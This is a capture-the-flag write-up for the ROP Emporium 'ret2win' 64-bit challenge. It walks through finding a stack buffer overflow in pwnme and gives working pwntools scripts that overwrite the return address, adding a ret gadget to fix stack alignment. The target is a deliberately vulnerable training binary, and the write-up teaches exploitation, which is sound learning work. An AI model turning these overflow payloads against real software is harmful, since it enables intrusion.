# ret2win - 64 Bit
Program execution:
```
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> <input_here>
```
Run checksec: `checksec ./ret2win`
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Identify useful symbols: `objdump -t ret2win`
```
00000000004006e8 l     F .text  000000000000006e              pwnme
0000000000400756 l     F .text  000000000000001b              ret2win
```
`pwnme` and `ret2win` seem interesting, so we'll make a mental note to look out for them when reverse engineering the binary.

Disassembling reveals that `main` calls `pwnme`
An analysis of `pwnme` shows a call to `read` that allows the unsafe reading of `0x38` bytes into a buffer at `rbp-0x20`:
```assembly
lea     rax, [rbp-0x20 {var_28}]
mov     edx, 0x38
mov     rsi, rax {var_28}
mov     edi, 0x0
call    read
```
Since address are 8 bytes, the return address for 64-bit programs is stored at `rbp+0x8`. We can clearly overwrite the return address to control code flow.

Examining `ret2win` shows that it run `system('/bin/cat flag.txt')` so this is the function that we want to return into:
```assembly
0040075f  puts(str: "Well done! Here's your flag:")
00400770  return system(line: "/bin/cat flag.txt")
```
So we want to fill the address space from `rbp-0x20` to `rbp+0x8` (`0x28 bytes`) with filler data, before writing the address of `ret2win` which is the function we want to return into.

Current exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./ret2win"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
payload += p64(elf.symbols['ret2win'])

p.sendline(payload)

p.interactive()
```

But if we run this script we get the following output:
```
Thank you!
Well done! Here's your flag:
[*] Got EOF while reading in interactive
$
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 773)
[*] Got EOF while sending in interactive
```

We can tell that code execution was hijacked, since the "Here's your flag" message was printed, but the actual flag is missing. Why is that?

Well, a part of the 64-bit calling convention is to maintain a 16-byte stack alignment. Later versions of GLIBC (as of 2.27 I believe, but don't quote me) will use the `movaps` to push data onto the stack, which works with a quadword (16 bytes) at a time. As a result, the memory operands used by `movaps` must be aligned to a 16-byte boundary to avoid a general-protection exception. 

Given the stack pointer must be a multiple of 8 (size of registers), failing to meet the requirement of a 16-byte boundery, means the stack pointer is aligned to 8 bytes.

We can work around this with a `ret;` gadget that will increment the stack pointer by 8, achieving the required alignment.

New exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./ret2win"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
# additional ret for 16 byte alignment
payload += p64(next(elf.search(asm('ret'))))
payload += p64(elf.symbols['ret2win'])

p.sendline(payload)

p.interactive()
```

And this time, running the script gets us our flag:
```
Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

